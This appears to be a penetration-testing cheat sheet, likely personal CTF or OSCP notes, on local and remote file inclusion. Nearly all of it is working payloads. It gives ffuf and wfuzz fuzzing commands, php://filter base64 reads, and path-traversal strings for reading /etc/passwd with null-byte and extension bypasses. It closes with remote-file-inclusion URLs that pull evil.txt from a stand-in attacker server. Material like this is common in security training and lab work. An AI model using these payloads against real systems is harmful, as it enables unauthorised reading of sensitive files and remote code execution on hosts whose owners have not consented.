## LFI

### Ffuf

	ffuf -request [request file] -request-proto http -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fw [word to filter out]

### Wfuzz

	wfuzz -c --hw [half word] -u http://dev.team.thm/script.php?page=FUZZ -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -f wfuzz_output

#### Bypassing php-execution

	http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index

#### Get file base64 encoded

	php://filter/convert.base64-encode/resource=[file]

#### Bypassing the added `.php` and other extra file-endings

	http://example.com/page=../../../../../../etc/passwd
	http://example.com/page=..././..././..././..././..././..././etc/passwd
	http://example.com/page=..//..//..//..//..//../etc/passwd
	http://example.com/page=..///..///..///..///..///../etc/passwd
	
	http://example.com/page=../../../../../../etc/passwd%00
	http://example.com/page=../../../../../../etc/passwd?

#### Folder that always exist

	/etc/hosts
	
	/etc/resolv.conf

#### add `%00jpg` to end of files

	/etc/passwd%00jpg

#### URL encode
	. -> %2E
	/ -> %2F

#### Refer this for more information

- https://sushant747.gitbooks.io/total-oscp-guide/local_file_inclusion.html
- https://highon.coffee/blog/lfi-cheat-sheet/

## RFI

Example:

	http://exampe.com/index.php?page=http://attackerserver.com/evil.txt
	http://exampe.com/index.php?page=\\attackerserver.com\evil.txt